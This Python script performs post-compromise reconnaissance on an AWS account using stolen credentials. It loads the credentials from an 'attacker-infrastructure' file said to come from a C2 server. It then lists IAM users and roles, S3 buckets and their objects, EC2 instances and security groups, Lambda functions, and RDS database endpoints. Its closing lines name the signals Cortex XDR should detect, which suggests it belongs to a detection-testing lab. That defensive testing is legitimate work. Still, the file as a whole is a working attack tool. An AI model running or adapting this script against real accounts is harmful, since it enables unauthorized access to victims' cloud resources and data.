#!/usr/bin/env python3
"""
AWS Cloud Enumeration Script
Uses stolen credentials to enumerate victim's AWS environment
"""
import boto3
import os
import sys
from datetime import datetime


def print_banner():
    """Print attacker operation banner"""
    print("=" * 70)
    print("  AWS CLOUD ENUMERATION - Using Stolen Credentials")
    print("=" * 70)
    print()


def verify_credentials():
    """Verify stolen credentials work"""
    print("[*] Verifying stolen credentials...")
    try:
        sts = boto3.client('sts')
        identity = sts.get_caller_identity()
        print(f"[+] Credentials valid!")
        print(f"    Account: {identity['Account']}")
        print(f"    User ARN: {identity['Arn']}")
        print(f"    User ID: {identity['UserId']}")
        return True
    except Exception as e:
        print(f"[-] Credential verification failed: {e}")
        return False


def enumerate_iam():
    """Enumerate IAM resources"""
    print("\n" + "=" * 70)
    print("[Phase 1] IAM Enumeration")
    print("=" * 70)
    
    try:
        iam = boto3.client('iam')
        
        # List users
        print("\n[*] Enumerating IAM users...")
        users = iam.list_users()
        print(f"[+] Found {len(users['Users'])} IAM users:")
        for user in users['Users'][:10]:  # Show first 10
            print(f"    - {user['UserName']} (Created: {user['CreateDate']})")
        
        # List roles
        print("\n[*] Enumerating IAM roles...")
        roles = iam.list_roles()
        print(f"[+] Found {len(roles['Roles'])} IAM roles:")
        for role in roles['Roles'][:10]:
            print(f"    - {role['RoleName']}")
        
        # Get account summary
        print("\n[*] Getting account summary...")
        summary = iam.get_account_summary()
        print(f"[+] Account Summary:")
        print(f"    - Users: {summary['SummaryMap'].get('Users', 0)}")
        print(f"    - Groups: {summary['SummaryMap'].get('Groups', 0)}")
        print(f"    - Roles: {summary['SummaryMap'].get('Roles', 0)}")
        print(f"    - Policies: {summary['SummaryMap'].get('Policies', 0)}")
        
    except Exception as e:
        print(f"[-] IAM enumeration failed: {e}")


def enumerate_s3():
    """Enumerate S3 buckets"""
    print("\n" + "=" * 70)
    print("[Phase 2] S3 Enumeration")
    print("=" * 70)
    
    try:
        s3 = boto3.client('s3')
        
        print("\n[*] Enumerating S3 buckets...")
        buckets = s3.list_buckets()
        print(f"[+] Found {len(buckets['Buckets'])} S3 buckets:")
        
        for bucket in buckets['Buckets']:
            bucket_name = bucket['Name']
            print(f"\n    [Bucket] {bucket_name}")
            
            try:
                # Get bucket location
                location = s3.get_bucket_location(Bucket=bucket_name)
                region = location['LocationConstraint'] or 'us-east-1'
                print(f"             Region: {region}")
                
                # Try to list objects
                objects = s3.list_objects_v2(Bucket=bucket_name, MaxKeys=5)
                if 'Contents' in objects:
                    print(f"             Objects: {len(objects['Contents'])} (showing first 5)")
                    for obj in objects['Contents'][:5]:
                        print(f"               - {obj['Key']} ({obj['Size']} bytes)")
                else:
                    print(f"             Objects: Empty bucket")
                
            except Exception as e:
                print(f"             Access denied or error: {e}")
        
    except Exception as e:
        print(f"[-] S3 enumeration failed: {e}")


def enumerate_ec2():
    """Enumerate EC2 instances"""
    print("\n" + "=" * 70)
    print("[Phase 3] EC2 Enumeration")
    print("=" * 70)
    
    try:
        ec2 = boto3.client('ec2')
        
        # Get regions
        print("\n[*] Getting available regions...")
        regions = ec2.describe_regions()
        print(f"[+] Found {len(regions['Regions'])} regions")
        
        # Check instances in current region
        print("\n[*] Enumerating EC2 instances in current region...")
        instances = ec2.describe_instances()
        
        instance_count = 0
        for reservation in instances['Reservations']:
            for instance in reservation['Instances']:
                instance_count += 1
                instance_id = instance['InstanceId']
                instance_type = instance['InstanceType']
                state = instance['State']['Name']
                
                print(f"\n    [Instance] {instance_id}")
                print(f"               Type: {instance_type}")
                print(f"               State: {state}")
                
                if 'Tags' in instance:
                    tags = {tag['Key']: tag['Value'] for tag in instance['Tags']}
                    if 'Name' in tags:
                        print(f"               Name: {tags['Name']}")
        
        if instance_count == 0:
            print("    No EC2 instances found in current region")
        else:
            print(f"\n[+] Total instances found: {instance_count}")
        
        # Enumerate security groups
        print("\n[*] Enumerating security groups...")
        security_groups = ec2.describe_security_groups()
        print(f"[+] Found {len(security_groups['SecurityGroups'])} security groups:")
        for sg in security_groups['SecurityGroups'][:5]:
            print(f"    - {sg['GroupName']} ({sg['GroupId']})")
        
    except Exception as e:
        print(f"[-] EC2 enumeration failed: {e}")


def enumerate_lambda():
    """Enumerate Lambda functions"""
    print("\n" + "=" * 70)
    print("[Phase 4] Lambda Function Enumeration")
    print("=" * 70)
    
    try:
        lambda_client = boto3.client('lambda')
        
        print("\n[*] Enumerating Lambda functions...")
        functions = lambda_client.list_functions()
        
        if functions['Functions']:
            print(f"[+] Found {len(functions['Functions'])} Lambda functions:")
            for func in functions['Functions']:
                print(f"\n    [Function] {func['FunctionName']}")
                print(f"               Runtime: {func['Runtime']}")
                print(f"               Handler: {func['Handler']}")
                print(f"               Memory: {func['MemorySize']} MB")
        else:
            print("    No Lambda functions found")
        
    except Exception as e:
        print(f"[-] Lambda enumeration failed: {e}")


def enumerate_rds():
    """Enumerate RDS databases"""
    print("\n" + "=" * 70)
    print("[Phase 5] RDS Database Enumeration")
    print("=" * 70)
    
    try:
        rds = boto3.client('rds')
        
        print("\n[*] Enumerating RDS instances...")
        instances = rds.describe_db_instances()
        
        if instances['DBInstances']:
            print(f"[+] Found {len(instances['DBInstances'])} RDS instances:")
            for db in instances['DBInstances']:
                print(f"\n    [Database] {db['DBInstanceIdentifier']}")
                print(f"               Engine: {db['Engine']} {db.get('EngineVersion', 'N/A')}")
                print(f"               Status: {db['DBInstanceStatus']}")
                print(f"               Endpoint: {db['Endpoint']['Address']}:{db['Endpoint']['Port']}")
        else:
            print("    No RDS instances found")
        
    except Exception as e:
        print(f"[-] RDS enumeration failed: {e}")


def save_results():
    """Save enumeration results"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"enumeration_results_{timestamp}.txt"
    print(f"\n[*] Results saved to: {filename}")


def main():
    """Main enumeration routine"""
    print_banner()
    
    # Check if stolen credentials file exists
    creds_file = "../1-attacker-infrastructure/stolen_aws_credentials"
    if os.path.exists(creds_file):
        print(f"[+] Using stolen credentials from: {creds_file}")
        os.environ['AWS_SHARED_CREDENTIALS_FILE'] = os.path.abspath(creds_file)
    else:
        print(f"[!] Stolen credentials not found at: {creds_file}")
        print("[!] Make sure C2 server has received credentials first")
        print("[!] Or set AWS_SHARED_CREDENTIALS_FILE environment variable")
    
    print()
    
    # Verify credentials
    if not verify_credentials():
        print("\n[-] Cannot proceed without valid credentials")
        sys.exit(1)
    
    # Execute enumeration phases
    enumerate_iam()
    enumerate_s3()
    enumerate_ec2()
    enumerate_lambda()
    enumerate_rds()
    
    # Summary
    print("\n" + "=" * 70)
    print("[SUCCESS] AWS Enumeration Complete")
    print("=" * 70)
    print()
    print("[*] Enumeration Summary:")
    print("    ✓ IAM users, roles, and policies enumerated")
    print("    ✓ S3 buckets and objects listed")
    print("    ✓ EC2 instances and security groups discovered")
    print("    ✓ Lambda functions identified")
    print("    ✓ RDS databases enumerated")
    print()
    print("⚠️  Cortex XDR should detect:")
    print("    - High-volume AWS API calls from unusual source")
    print("    - Enumeration pattern across multiple services")
    print("    - Unauthorized access from stolen credentials")
    print()


if __name__ == "__main__":
    main()
